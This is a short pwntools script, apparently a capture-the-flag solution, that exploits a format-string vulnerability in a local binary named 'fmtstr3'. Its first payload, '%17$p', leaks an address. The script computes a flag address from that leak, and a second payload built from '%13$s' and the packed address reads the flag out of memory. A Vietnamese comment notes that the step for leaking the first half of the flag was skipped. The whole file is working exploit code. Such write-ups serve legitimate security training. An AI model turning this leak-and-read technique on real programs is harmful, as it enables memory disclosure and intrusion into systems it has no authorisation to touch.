#!/bin/python3
from pwn import *
exe = ELF('./fmtstr3')
#luu y: da bo qua buoc leak 1 nua dau cua flag 
#context.terminal = ['alacritty', '-e' ]
p = process(exe.path)
#gdb.attach(p,gdbscript='''

#b*run+364
#b*run+434


#''')
input()
payload = b'%17$p'
p.sendlineafter(b'Your name:',payload)
p.recvuntil(b'Hello')
leak_address = int(p.recvline(),16 )
flag2_address = leak_address + 11130
log.info(f'flag2_address:' + hex(flag2_address))
log.info(f'lleak_address:' + hex(leak_address))
payload = b'%13$saaa'
payload += p64(flag2_address)
p.sendlineafter(b'greeting:',payload)
p.interactive()

